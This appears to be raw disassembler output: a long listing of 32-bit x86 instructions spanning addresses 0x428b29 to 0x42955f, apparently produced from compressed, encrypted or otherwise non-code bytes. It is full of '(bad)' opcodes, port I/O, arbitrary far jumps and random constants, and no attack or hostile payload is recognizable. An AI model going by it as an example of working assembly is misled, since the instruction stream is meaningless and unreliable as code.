  428b29:	inc    ecx
  428b2a:	push   esi
  428b2b:	jns    0x428b25
  428b2d:	test   ah,al
  428b2f:	sub    al,0x76
  428b31:	je     0x428b3c
  428b33:	or     ah,BYTE PTR ds:0x83716d08
  428b39:	mov    ds:0xb2668fd4,al
  428b3e:	push   edi
  428b3f:	adc    esi,DWORD PTR [edi+0x3a9b17f3]
  428b45:	cmp    bh,ah
  428b47:	out    0x3c,al
  428b49:	(bad)  
  428b4a:	jbe    0x428baa
  428b4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428b4d:	pop    ds
  428b4e:	(bad)  
  428b4f:	loopne 0x428aea
  428b51:	dec    ebp
  428b52:	xchg   edx,eax
  428b53:	(bad)  
  428b54:	mov    bl,0xff
  428b56:	xor    al,0x45
  428b58:	sahf   
  428b59:	push   ecx
  428b5a:	mov    ebx,0xa709d1e8
  428b5f:	sub    al,0xbf
  428b61:	repnz inc edx
  428b63:	cdq    
  428b64:	fdiv   DWORD PTR [ebx]
  428b66:	sbb    eax,0x610b6986
  428b6b:	inc    esp
  428b6c:	not    ch
  428b6e:	and    edi,DWORD PTR [edi+eiz*2]
  428b71:	jg     0x428be6
  428b73:	inc    edi
  428b74:	and    eax,0x192b04f8
  428b79:	iret   
  428b7a:	iret   
  428b7b:	mov    ch,0xa8
  428b7d:	pop    es
  428b7e:	mov    ds:0xef655273,eax
  428b83:	xor    edx,edi
  428b85:	stos   DWORD PTR es:[edi],eax
  428b86:	ins    BYTE PTR es:[edi],dx
  428b87:	imul   ebx,ecx,0xfffffff6
  428b8a:	and    bh,BYTE PTR [eax+ebx*1+0x7f]
  428b8e:	sbb    edx,DWORD PTR [eax+eax*1+0x0]
	...
  428bf2:	add    BYTE PTR [eax],al
  428bf4:	lds    edx,FWORD PTR [ebp-0x76]
  428bf7:	cli    
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0x21209e
  428c04:	push   esp
  428c05:	mov    bl,0x1
  428c07:	add    BYTE PTR [ecx+eax*1],al
  428c0a:	add    BYTE PTR [eax],al
  428c0c:	arpl   WORD PTR [eax-0x5c32f797],di
  428c12:	test   BYTE PTR [ecx],0x44
  428c15:	mov    esi,0x620e4376
  428c1a:	xchg   BYTE PTR ds:0xc32058db,ah
  428c20:	and    DWORD PTR [ebx],edi
  428c22:	and    al,0x1c
  428c24:	pop    ebx
  428c25:	adc    eax,0xcab809bd
  428c2a:	(bad)  
  428c2c:	addr16 fucomip st,st(6)
  428c2f:	push   0x67d6f58e
  428c34:	dec    ebx
  428c35:	cmp    ebp,DWORD PTR [ecx+0xa]
  428c38:	dec    edx
  428c39:	or     edi,DWORD PTR [edi]
  428c3b:	xchg   DWORD PTR ds:0xd61a0ba2,eax
  428c41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428c42:	pop    ds
  428c43:	dec    edi
  428c44:	setp   cl
  428c47:	outs   dx,DWORD PTR ds:[esi]
  428c48:	jle    0x428bdf
  428c4a:	pop    edi
  428c4b:	adc    DWORD PTR [ecx],eax
  428c4d:	lods   eax,DWORD PTR ds:[esi]
  428c4e:	xchg   ebx,eax
  428c4f:	test   al,0xc6
  428c51:	adc    DWORD PTR [esi+0x24db6ac6],eax
  428c57:	gs inc edi
  428c59:	btc    DWORD PTR [edx+esi*2-0x23a13dfc],edx
  428c61:	mov    al,BYTE PTR [esi+eiz*1-0xd]
  428c65:	retf   0xe774
  428c68:	pop    esi
  428c69:	xor    al,0xaf
  428c6b:	loop   0x428c44
  428c6d:	imul   ebx,DWORD PTR [esi],0xfffffff8
  428c70:	test   al,0x8c
  428c72:	das    
  428c73:	stos   DWORD PTR es:[edi],eax
  428c74:	aad    0x22
  428c76:	lods   al,BYTE PTR ds:[esi]
  428c77:	sbb    bl,BYTE PTR [ebx+0x11]
  428c7a:	popa   
  428c7b:	sbb    eax,0xe52c1f90
  428c80:	jecxz  0x428c5b
  428c82:	mov    ebx,0x56e3a459
  428c87:	fisubr WORD PTR [ecx]
  428c89:	mov    dh,0x9
  428c8c:	idiv   BYTE PTR [eax-0x11]
  428c8f:	add    dl,BYTE PTR [ebx-0x3165b844]
  428c95:	inc    esi
  428c96:	hlt    
  428c97:	mov    ss,WORD PTR [eax+0x66300813]
  428c9d:	out    0x9a,eax
  428c9f:	pop    ebp
  428ca0:	dec    eax
  428ca1:	test   al,0xea
  428ca3:	int3   
  428ca4:	jo     0x428cc4
  428ca6:	xlat   BYTE PTR ds:[ebx]
  428ca7:	push   es
  428ca8:	mov    edx,0x78a660b7
  428cad:	js     0x428c6f
  428caf:	out    dx,al
  428cb0:	adc    ebp,DWORD PTR [edx+0x5557d931]
  428cb6:	mov    al,ds:0x87489382
  428cbb:	sub    DWORD PTR [edx],0x5f
  428cbe:	dec    edx
  428cbf:	sbb    al,0xca
  428cc1:	mov    edx,0xe321081f
  428cc6:	fistp  QWORD PTR [edx+0x75]
  428cc9:	xor    cl,dl
  428ccb:	jb     0x428c57
  428ccd:	outs   dx,BYTE PTR ds:[esi]
  428cce:	push   ebp
  428ccf:	out    dx,al
  428cd0:	cdq    
  428cd1:	push   edx
  428cd2:	in     al,dx
  428cd3:	jnp    0x428ccf
  428cd5:	dec    esp
  428cd6:	sbb    al,0x46
  428cd8:	dec    edi
  428cd9:	jmp    0x428d54
  428cdb:	aaa    
  428cdc:	push   0x58a1f44a
  428ce1:	xchg   ebp,eax
  428ce2:	fidiv  WORD PTR [ecx-0x4f]
  428ce5:	push   ecx
  428ce6:	jno    0x428c6f
  428ce8:	es out dx,al
  428cea:	lahf   
  428ceb:	into   
  428cec:	xor    ah,dl
  428cee:	jg     0x428d3d
  428cf0:	xchg   esi,eax
  428cf1:	mov    cl,0x62
  428cf3:	fs pusha 
  428cf5:	adc    eax,0x7a9ed4c
  428cfa:	enter  0xb4eb,0xd9
  428cfe:	pop    edi
  428cff:	cmp    BYTE PTR [ebx+0x77],0xad
  428d03:	inc    ecx
  428d04:	mov    ebp,0xba0904b2
  428d09:	xor    al,0x96
  428d0b:	xchg   BYTE PTR [ebx+0xabf30f],ah
	...
  428d71:	add    BYTE PTR [eax],al
  428d73:	add    BYTE PTR [ecx-0xace0e4b],al
  428d79:	jne    0x428d3c
  428d7b:	mov    ch,0x90
  428d7d:	int3   
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0xe97a
  428d82:	mov    ebp,0x1b4588b
  428d87:	add    BYTE PTR [ecx+eax*1],al
  428d8a:	add    BYTE PTR [eax],al
  428d8c:	dec    ecx
  428d8d:	mov    BYTE PTR [eax+0x7b32bf74],bh
  428d93:	and    edi,edi
  428d95:	push   ss
  428d96:	mov    ch,0xdd
  428d98:	dec    eax
  428d99:	retf   
  428d9a:	push   eax
  428d9b:	(bad)  
  428d9c:	sub    dl,BYTE PTR [edi+0x72d3bb0f]
  428da2:	jne    0x428de4
  428da4:	mov    ecx,0x74fef8f6
  428da9:	cmp    eax,0x47cbf1d1
  428dae:	xor    eax,0xd7d6c764
  428db3:	push   ds
  428db4:	xor    al,0x12
  428db6:	rcl    DWORD PTR [ebp-0x4c],0xd4
  428dba:	les    esp,FWORD PTR [edx]
  428dbc:	dec    edi
  428dbd:	imul   esi,DWORD PTR [edi+edi*1],0x9d622afd
  428dc4:	fsub   QWORD PTR ds:[ebp+0x457ec6ef]
  428dcb:	sahf   
  428dcc:	das    
  428dcd:	imul   edx,ecx,0x24
  428dd0:	sti    
  428dd1:	ds cdq 
  428dd3:	mov    ah,0x93
  428dd5:	mov    ds:0x399cf575,eax
  428dda:	lods   eax,DWORD PTR ds:[esi]
  428ddb:	push   esp
  428ddc:	cmp    DWORD PTR [ebx+0x20],eax
  428ddf:	or     ah,BYTE PTR [esi-0x17]
  428de2:	popf   
  428de3:	mov    al,ds:0xaf15d3ea
  428de8:	add    al,0xf0
  428dea:	jge    0x428e13
  428dec:	push   ecx
  428ded:	out    dx,eax
  428dee:	aas    
  428def:	mov    dl,0xc7
  428df1:	jmp    0xa9e3:0x7a40f36a
  428df8:	into   
  428df9:	test   eax,0xc0b7ee03
  428dfe:	minps  xmm4,XMMWORD PTR [edi+ebx*2+0x5f]
  428e03:	repz pop ebx
  428e05:	and    bh,BYTE PTR [ecx]
  428e07:	sti    
  428e08:	mov    ebp,0x17236e6e
  428e0d:	dec    ecx
  428e0e:	adc    BYTE PTR [esi+ebp*4-0x2b],cl
  428e12:	mov    bl,0x44
  428e14:	xchg   ebx,eax
  428e15:	jb     0x428e61
  428e17:	stos   BYTE PTR es:[edi],al
  428e18:	addr16 mov esp,0x3bf16a33
  428e1e:	lods   al,BYTE PTR ds:[esi]
  428e1f:	rol    DWORD PTR [ecx],0xe7
  428e22:	inc    ecx
  428e23:	jnp    0x428e9d
  428e25:	dec    ebp
  428e26:	ja     0x428dfb
  428e28:	enter  0xbf8c,0xe
  428e2c:	cld    
  428e2d:	fwait
  428e2e:	push   DWORD PTR [eax]
  428e30:	in     al,0xf6
  428e32:	push   0x83809858
  428e37:	ror    BYTE PTR [ebp+esi*1+0x24],1
  428e3b:	mov    ds:0xbb1aa7d3,al
  428e40:	mov    bl,0xfc
  428e42:	or     eax,esp
  428e44:	jno    0x428e49
  428e46:	ja     0x428e06
  428e48:	into   
  428e49:	loop   0x428e90
  428e4b:	mov    al,0x7c
  428e4d:	add    DWORD PTR [edx],eax
  428e4f:	scas   eax,DWORD PTR es:[edi]
  428e50:	push   cs
  428e51:	in     eax,dx
  428e52:	int3   
  428e53:	daa    
  428e54:	xchg   ebp,eax
  428e55:	call   0xeeb0:0x55c5861d
  428e5c:	push   es
  428e5d:	jl     0x428de6
  428e5f:	sbb    BYTE PTR [ebx+0x35e9575c],bh
  428e65:	push   ebx
  428e66:	sbb    bl,al
  428e68:	inc    esp
  428e69:	outs   dx,BYTE PTR ds:[esi]
  428e6a:	pop    edi
  428e6b:	xchg   BYTE PTR [ebx+0x1a],al
  428e6e:	dec    esp
  428e6f:	mov    edi,0x67593d01
  428e74:	test   eax,0x14ceb49d
  428e79:	xor    eax,0x8b75aba8
  428e7e:	xchg   dl,bh
  428e80:	cmp    al,0xf
  428e82:	hlt    
  428e83:	pop    DWORD PTR [ebx-0x67c0add5]
  428e89:	add    al,0x46
  428e8b:	dec    eax
  428e8c:	js     0x428ed3
  428e8e:	jnp    0x428e49
	...
  428ef4:	dec    edi
  428ef5:	pop    ebp
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0x1a
  428f01:	(bad)  
  428f02:	sbb    esp,ebp
  428f04:	pop    esp
  428f05:	mov    ch,0x1
  428f07:	add    BYTE PTR [ecx+eax*1],al
  428f0a:	add    BYTE PTR [eax],al
  428f0c:	fsubr  st(2),st
  428f0e:	add    eax,0xe7f8c3a9
  428f13:	adc    DWORD PTR ds:0x26e234b8,0xffffff8f
  428f1a:	add    BYTE PTR [ebp-0x55],ah
  428f1d:	outs   dx,DWORD PTR ds:[esi]
  428f1e:	stc    
  428f1f:	in     al,dx
  428f20:	mov    ah,ch
  428f22:	mov    ?,edx
  428f24:	mov    eax,0xb0f5edab
  428f29:	jge    0x428f7d
  428f2b:	jne    0x428ec7
  428f2d:	mov    eax,0x8acc245c
  428f32:	imul   esi,DWORD PTR [ecx+0x5e],0x40
  428f36:	sbb    DWORD PTR [edx-0x2],ebp
  428f39:	test   BYTE PTR [esp+eiz*8+0x7f],bh
  428f3d:	pop    ebp
  428f3e:	dec    esi
  428f3f:	out    dx,al
  428f40:	jmp    0x428f5b
  428f42:	push   ds
  428f43:	adc    esp,ebp
  428f45:	adc    al,al
  428f47:	jbe    0x428fbc
  428f49:	xlat   BYTE PTR ds:[ebx]
  428f4a:	pop    ds
  428f4b:	test   eax,0x32bb8522
  428f50:	dec    ecx
  428f51:	xor    al,0x12
  428f53:	into   
  428f54:	sti    
  428f55:	cmc    
  428f56:	pop    es
  428f57:	mov    edi,0x7ae28742
  428f5c:	ficom  DWORD PTR [ebp-0x6af47899]
  428f62:	xchg   BYTE PTR [ecx],ch
  428f64:	xchg   ecx,eax
  428f65:	jne    0x428f40
  428f67:	rol    DWORD PTR [esi+ebp*4-0x584d128b],cl
  428f6e:	mov    dh,0x13
  428f70:	loopne 0x428f11
  428f72:	dec    ebx
  428f73:	cld    
  428f74:	jp     0x428f96
  428f76:	bound  edx,QWORD PTR [ecx]
  428f78:	lods   eax,DWORD PTR ds:[esi]
  428f79:	pop    eax
  428f7a:	sbb    ch,cl
  428f7c:	dec    edi
  428f7d:	out    0x2b,al
  428f7f:	fsubp  st(1),st
  428f81:	xlat   BYTE PTR ds:[ebx]
  428f82:	dec    BYTE PTR [edi-0x1a017553]
  428f88:	sub    BYTE PTR [ebx],0xdb
  428f8b:	and    BYTE PTR [eax+ecx*1-0x7e516820],cl
  428f92:	fdiv   DWORD PTR [esi+0x16]
  428f95:	mov    ch,0xd7
  428f97:	std    
  428f98:	cmp    ah,dh
  428f9a:	jle    0x428ffb
  428f9c:	mov    dh,0xac
  428f9e:	jb     0x428f41
  428fa0:	inc    DWORD PTR [ebx]
  428fa2:	jno    0x428f65
  428fa4:	dec    ebx
  428fa5:	dec    edx
  428fa6:	push   edx
  428fa7:	and    dh,BYTE PTR [ebx+0x6f]
  428faa:	(bad)  
  428fab:	jmp    0xc1dd9f10
  428fb0:	mov    ecx,0x752fbae
  428fb5:	sbb    al,0x82
  428fb7:	ins    BYTE PTR es:[edi],dx
  428fb8:	(bad)  
  428fb9:	call   0x9e96a3e6
  428fbe:	ret    0x7ba1
  428fc1:	jne    0x429036
  428fc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428fc4:	lods   al,BYTE PTR ds:[esi]
  428fc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428fc6:	push   esi
  428fc7:	pop    ebp
  428fc8:	(bad)  
  428fc9:	in     eax,0x5b
  428fcb:	add    cl,ch
  428fcd:	push   ebx
  428fce:	lods   eax,DWORD PTR ds:[esi]
  428fcf:	ret    
  428fd0:	pop    eax
  428fd1:	(bad)  [esi]
  428fd3:	cmp    ebx,DWORD PTR [ebp-0x7b20d0f6]
  428fd9:	push   esi
  428fda:	xor    eax,0x3c0120
  428fdf:	adc    al,0xa5
  428fe1:	fsub   DWORD PTR [esi-0x648e9974]
  428fe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428fe8:	and    cl,bh
  428fea:	push   ebp
  428feb:	cld    
  428fec:	lock (bad) 
  428fee:	shl    ah,0x8c
  428ff1:	fidivr WORD PTR [ebx+0x50e36668]
  428ff7:	or     DWORD PTR [ecx+ebx*8-0x4a],esp
  428ffb:	adc    ch,al
  428ffd:	int3   
  428ffe:	dec    edx
  428fff:	aas    
  429000:	outs   dx,DWORD PTR ss:[esi]
  429002:	or     edx,ebx
  429004:	or     BYTE PTR [ecx],bl
  429006:	push   es
  429007:	pop    ebx
  429008:	push   DWORD PTR [ebx-0x6e826af6]
  42900e:	jmp    0x0:0xa
	...
  429071:	add    BYTE PTR [eax],al
  429073:	add    cl,ah
  429075:	in     al,dx
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0xc5fc7b77
  429081:	jmp    0x42908c
  429083:	or     al,0x60
  429085:	mov    dh,0x1
  429087:	add    BYTE PTR [ecx+eax*1],al
  42908a:	add    BYTE PTR [eax],al
  42908c:	jecxz  0x4290df
  42908e:	or     eax,0x5313e331
  429093:	(bad)  
  429094:	jnp    0x429075
  429096:	shl    DWORD PTR [esi],1
  429098:	out    0x36,eax
  42909a:	in     eax,dx
  42909b:	es out dx,eax
  42909d:	xchg   DWORD PTR [ecx+edi*8-0x55dfe26b],ebp
  4290a4:	out    dx,eax
  4290a5:	inc    ecx
  4290a6:	int3   
  4290a7:	inc    edx
  4290a8:	ret    0x3db4
  4290ab:	mov    ch,0x8e
  4290ad:	inc    ecx
  4290ae:	mov    DWORD PTR [edx+ecx*8+0x2df111ef],0x1dabdbbe
  4290b9:	shr    DWORD PTR [edi-0x71],cl
  4290bc:	xchg   bl,cl
  4290be:	or     ax,0x9e3c
  4290c2:	xchg   BYTE PTR [ebp+0x23],al
  4290c5:	stc    
  4290c6:	or     edi,DWORD PTR [ecx]
  4290c8:	int3   
  4290c9:	hlt    
  4290ca:	sub    eax,0x62d52513
  4290cf:	fsubr  DWORD PTR [ecx+0x445401e1]
  4290d5:	fisub  WORD PTR [ecx+edx*4-0x7d]
  4290d9:	pop    ebx
  4290da:	sbb    DWORD PTR [eax],ebx
  4290dc:	rcr    edx,cl
  4290de:	rcr    BYTE PTR [edi+0xb],cl
  4290e1:	or     DWORD PTR [ebp-0x70],edi
  4290e4:	scas   al,BYTE PTR es:[edi]
  4290e5:	in     al,0xe4
  4290e7:	gs pop edi
  4290e9:	das    
  4290ea:	xchg   ebp,eax
  4290eb:	and    ebp,esp
  4290ed:	fsubr  DWORD PTR [ebx]
  4290ef:	and    dl,BYTE PTR [ebp-0x5b]
  4290f2:	sbb    eax,0xdd8d0ab8
  4290f7:	ins    BYTE PTR es:[edi],dx
  4290f8:	inc    eax
  4290f9:	cmp    cl,BYTE PTR [ebx+0x1e6a9d5f]
  4290ff:	xor    DWORD PTR [ebx],ecx
  429101:	loope  0x4290d8
  429103:	or     DWORD PTR [eax-0x5c],esi
  429106:	push   ebx
  429107:	xor    al,dl
  429109:	sar    eax,cl
  42910b:	mov    esi,0xb7f1776a
  429110:	rcr    eax,0xfe
  429113:	xchg   ebp,eax
  429114:	call   FWORD PTR [edi-0x74c04029]
  42911a:	out    dx,al
  42911b:	xchg   esp,eax
  42911c:	out    dx,al
  42911d:	xchg   ebp,eax
  42911e:	inc    edi
  42911f:	push   ebx
  429120:	push   0x9ef9772
  429125:	mov    edx,0x4acc5cc4
  42912a:	mov    ah,0x84
  42912c:	fst    st(7)
  42912e:	or     eax,0xd86b8f7e
  429133:	ret    0xc528
  429136:	mov    eax,0xf057f1ea
  42913b:	outs   dx,DWORD PTR ds:[esi]
  42913c:	stos   BYTE PTR es:[edi],al
  42913d:	fcom   st(2)
  42913f:	and    DWORD PTR [edx+0xded9e0a],edi
  429145:	imul   edi,DWORD PTR [edx],0xb21578a6
  42914b:	add    al,0xd9
  42914d:	mov    ds:0xd9eb1634,al
  429152:	es (bad) 
  429154:	dec    ebx
  429155:	mov    ebp,0xfbe699be
  42915a:	outs   dx,BYTE PTR gs:[esi]
  42915c:	push   edx
  42915d:	push   edi
  42915e:	inc    ebp
  42915f:	dec    edi
  429160:	sahf   
  429161:	jge    0x429148
  429163:	ret    
  429164:	xor    DWORD PTR [edi-0xd],edi
  429167:	inc    esi
  429168:	cmp    BYTE PTR [esi+0x6fd8e2ff],cl
  42916e:	test   edx,esp
  429170:	mov    BYTE PTR [edx-0x35],dh
  429173:	fmul   DWORD PTR ds:0x773f5176
  429179:	cli    
  42917a:	and    edi,ebp
  42917c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42917d:	into   
  42917e:	lds    ecx,FWORD PTR [esi]
  429180:	neg    BYTE PTR [eax+0x390388ee]
  429186:	mov    ?,WORD PTR [ebp+0x47d9f926]
  42918c:	mov    ecx,0xb50bcf
	...
  4291f1:	add    BYTE PTR [eax],al
  4291f3:	add    BYTE PTR [esi-0x79],dl
  4291f6:	std    
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [esp+ebx*4+0x64caaedf],0x40001b7
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    BYTE PTR [edi+0x3b],cl
  42920e:	pop    ss
  42920f:	scas   al,BYTE PTR es:[edi]
  429210:	xor    BYTE PTR [esi-0x404e01c7],cl
  429216:	cmp    DWORD PTR [ecx+0x36acf422],edx
  42921c:	scas   eax,DWORD PTR es:[edi]
  42921d:	fst    st(1)
  42921f:	int    0x11
  429221:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429222:	icebp  
  429223:	fstp   TBYTE PTR [ebx]
  429225:	push   edx
  429226:	das    
  429227:	lods   al,BYTE PTR ds:[esi]
  429228:	cmp    eax,0x4a2a3ed6
  42922d:	add    al,0xb0
  42922f:	inc    eax
  429230:	nop
  429231:	pop    ebx
  429232:	jo     0x42929f
  429234:	es dec esp
  429236:	in     eax,0xb2
  429238:	test   BYTE PTR [ecx+edi*8-0x3b],cl
  42923c:	add    DWORD PTR [edx],esp
  42923e:	jne    0x429274
  429240:	mov    ebp,0x9c96103b
  429245:	sub    cl,bl
  429247:	push   esi
  429248:	test   BYTE PTR [esp+ebp*2+0x16c8dad1],ah
  42924f:	sbb    eax,0x7956e41e
  429254:	sahf   
  429255:	inc    esi
  429256:	ds xchg edi,eax
  429258:	mov    ds:0x1d0c4de3,eax
  42925d:	sbb    ecx,ebp
  42925f:	sub    eax,0x4107284c
  429264:	out    0xd8,eax
  429266:	arpl   WORD PTR [ecx+0x57],ax
  429269:	not    bl
  42926b:	aaa    
  42926c:	mov    dh,0xa8
  42926e:	xor    BYTE PTR [eax+ebx*4],dh
  429271:	xlat   BYTE PTR ds:[ebx]
  429272:	mov    eax,ds:0xe298482f
  429277:	popf   
  429278:	or     DWORD PTR [ecx+0x5e],ebx
  42927b:	jnp    0x42926e
  42927d:	js     0x429238
  42927f:	push   ebx
  429280:	ds call 0xea2e:0x2df4690d
  429288:	mov    bh,0x80
  42928a:	jge    0x429271
  42928c:	lahf   
  42928d:	pop    eax
  42928e:	xlat   BYTE PTR ds:[ebx]
  42928f:	sbb    edi,DWORD PTR [ebp-0x4f]
  429292:	and    al,BYTE PTR [edx-0x1d]
  429295:	cwde   
  429296:	nop
  429297:	mov    DWORD PTR [ecx],esp
  429299:	js     0x4292c7
  42929b:	scas   al,BYTE PTR es:[edi]
  42929c:	ds lahf 
  42929e:	clc    
  42929f:	sbb    eax,0xa6c11884
  4292a4:	lock in eax,0x2e
  4292a7:	xchg   edi,eax
  4292a8:	and    esi,0xffffff93
  4292ab:	cs pop ecx
  4292ad:	std    
  4292ae:	dec    esi
  4292af:	gs (bad) 
  4292b1:	mov    BYTE PTR ds:0xc7879b92,ch
  4292b7:	jmp    0x8bd5:0xfb102069
  4292be:	jne    0x429335
  4292c0:	fdiv   st,st(2)
  4292c2:	neg    BYTE PTR [eax]
  4292c4:	mov    al,ds:0x79c60a90
  4292c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4292ca:	pop    edx
  4292cb:	ror    BYTE PTR [eax],1
  4292cd:	xchg   edi,eax
  4292ce:	test   DWORD PTR [edx-0x7c],0xf1d98cf2
  4292d5:	ds and al,al
  4292d8:	jp     0x429284
  4292da:	mov    ebx,0xf8624d91
  4292df:	push   ds
  4292e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4292e1:	int    0x3a
  4292e3:	arpl   sp,cx
  4292e5:	stos   BYTE PTR es:[edi],al
  4292e6:	fs fwait
  4292e8:	xor    ebp,DWORD PTR [ebp+0x68e99cbe]
  4292ee:	gs pop ecx
  4292f0:	out    dx,al
  4292f1:	add    ecx,DWORD PTR [ebp-0x57]
  4292f4:	xor    al,0xd5
  4292f6:	xor    ebp,esp
  4292f8:	cmp    ecx,DWORD PTR [esi+ebx*8+0x6965788]
  4292ff:	scas   al,BYTE PTR es:[edi]
  429300:	fisubr WORD PTR [ebx]
  429302:	(bad)  
  429303:	out    dx,eax
  429304:	xor    ecx,edi
  429306:	repnz cmp eax,0x86ff7f54
  42930c:	xor    al,0xc
  42930f:	data16 add BYTE PTR [eax],al
	...
  429372:	add    BYTE PTR [eax],al
  429374:	lock adc al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0x59
  429381:	add    al,0x50
  429383:	mov    ch,0x68
  429385:	mov    eax,0x1040001
  42938a:	add    BYTE PTR [eax],al
  42938c:	ret    
  42938d:	add    dl,bl
  42938f:	fs push cs
  429391:	mov    al,BYTE PTR [ebp+0x27d93235]
  429397:	repnz cmp eax,0xc2c55c7c
  42939d:	jns    0x4293c7
  42939f:	test   al,0x86
  4293a1:	stos   BYTE PTR es:[edi],al
  4293a2:	loopne 0x4293f4
  4293a4:	mov    edi,0xf671cca
  4293a9:	arpl   WORD PTR [ebx],si
  4293ab:	pop    ebp
  4293ac:	or     al,0x7
  4293ae:	lods   eax,DWORD PTR ds:[esi]
  4293af:	pushf  
  4293b0:	lahf   
  4293b1:	cmp    al,0xed
  4293b3:	or     al,0x77
  4293b5:	sar    dh,1
  4293b7:	push   ebx
  4293b8:	mov    ebx,0x80c92242
  4293bd:	inc    eax
  4293be:	jle    0x4293c7
  4293c0:	jle    0x4293cf
  4293c2:	pop    ds
  4293c3:	xor    BYTE PTR [ebx-0x69],ch
  4293c6:	jne    0x4293a3
  4293c8:	sbb    BYTE PTR [ecx],bh
  4293ca:	outs   dx,DWORD PTR ds:[esi]
  4293cb:	fdivr  DWORD PTR [edi+ebx*8-0x5527c53a]
  4293d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4293d3:	call   0x19481b9
  4293d8:	adc    ch,BYTE PTR [edx+esi*2-0x4bf8c13b]
  4293df:	test   BYTE PTR [esi],ch
  4293e1:	(bad)  
  4293e2:	cmp    DWORD PTR [edx],eax
  4293e4:	clc    
  4293e5:	sbb    esi,DWORD PTR [edx+0x40c77dc0]
  4293eb:	test   eax,0x290c3ae4
  4293f0:	cli    
  4293f1:	inc    esp
  4293f2:	imul   edi,DWORD PTR [eax],0xffffffbf
  4293f5:	mov    ?,WORD PTR [ecx-0x8]
  4293f8:	aaa    
  4293f9:	cli    
  4293fa:	inc    edx
  4293fb:	dec    ebp
  4293fc:	ss in  eax,dx
  4293fe:	ins    BYTE PTR es:[edi],dx
  4293ff:	call   0x4193e34f
  429404:	mov    eax,?
  429406:	and    bh,al
  429408:	jecxz  0x429465
  42940a:	and    DWORD PTR [edx+0x98b8467],edx
  429410:	mov    ds:0x59bd62e6,al
  429415:	push   esi
  429416:	jne    0x4293ff
  429418:	jle    0x429479
  42941a:	pop    esi
  42941b:	xor    BYTE PTR [ebp+0x62551cdd],al
  429421:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429422:	push   es
  429423:	mov    ch,0xc1
  429425:	cmp    DWORD PTR ds:[edx+0x45c68c1a],esp
  42942c:	and    ch,bh
  42942e:	pop    esp
  42942f:	mov    al,0x89
  429431:	call   0x98bf:0xc46d06db
  429438:	jnp    0x429409
  42943a:	fnstcw WORD PTR [ebx]
  42943c:	lods   al,BYTE PTR ds:[esi]
  42943d:	das    
  42943e:	das    
  42943f:	xchg   edx,eax
  429440:	aam    0xcc
  429442:	fcmovbe st,st(1)
  429444:	mov    cl,0xb4
  429446:	mov    cl,0xe3
  429448:	fdiv   QWORD PTR [eax+0x3a]
  42944b:	xor    dh,BYTE PTR ds:0xdc496d8a
  429451:	dec    edx
  429452:	and    bh,BYTE PTR [eax-0x9]
  429455:	into   
  429456:	mov    al,0xe9
  429458:	pushf  
  429459:	cmp    DWORD PTR [ecx-0x27],0xd8b6ec94
  429460:	pop    esi
  429461:	mov    esi,0xab5a62ee
  429466:	xchg   ebp,esp
  429468:	mov    ebx,DWORD PTR [edx]
  42946a:	dec    eax
  42946b:	mov    DWORD PTR ds:0xe69e6559,ebp
  429471:	(bad)  
  429472:	ja     0x429429
  429474:	xchg   ax,ax
  429476:	je     0x4294de
  429478:	jmp    0x42948d
  42947a:	imul   ebx,DWORD PTR [edx],0x996a99d8
  429480:	(bad)  
  429481:	in     al,0x44
  429483:	dec    ecx
  429484:	std    
  429485:	aad    0xab
  429487:	mov    eax,0x570d2e15
  42948c:	inc    eax
  42948d:	cmc    
  42948e:	mov    ecx,0x4c
	...
  4294f3:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  4294f7:	sub    al,0x53
  4294f9:	ds jg  0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp+0x4b1e0cea],dx
  429503:	mov    ecx,0x1b96c
  429508:	add    al,0x1
  42950a:	add    BYTE PTR [eax],al
  42950c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42950d:	lods   eax,DWORD PTR ds:[esi]
  42950e:	stos   BYTE PTR es:[edi],al
  42950f:	jecxz  0x429520
  429511:	jnp    0x429590
  429513:	mov    WORD PTR [edi],es
  429515:	rcr    BYTE PTR [edi-0x5b],cl
  429518:	repnz add BYTE PTR [ebx-0x7542f3aa],cl
  42951f:	pop    ds
  429520:	adc    ebx,DWORD PTR [esi]
  429522:	cs add bl,dl
  429525:	rol    ebp,cl
  429527:	mov    BYTE PTR [ecx+0x61],dl
  42952a:	jge    0x4295a7
  42952c:	sub    eax,0x979f7274
  429531:	adc    DWORD PTR [esi+0x1c9f6712],0x62
  429538:	add    BYTE PTR [ebx],0x7a
  42953b:	xor    edx,DWORD PTR [ecx]
  42953d:	sub    DWORD PTR [edx-0x1552260],edi
  429543:	push   esp
  429544:	mov    ch,0x75
  429546:	inc    ebx
  429547:	cmp    ch,BYTE PTR [ebx]
  429549:	mov    bh,0x11
  42954b:	retf   0x9ddd
  42954e:	loopne 0x429598
  429550:	jno    0x429591
  429552:	(bad)  
  429553:	fimul  WORD PTR [ebp+0x1da25c56]
  429559:	inc    esi
  42955a:	ret    0xb1fb
  42955d:	push   esi
  42955e:	scas   eax,DWORD PTR es:[edi]
  42955f:	pusha  
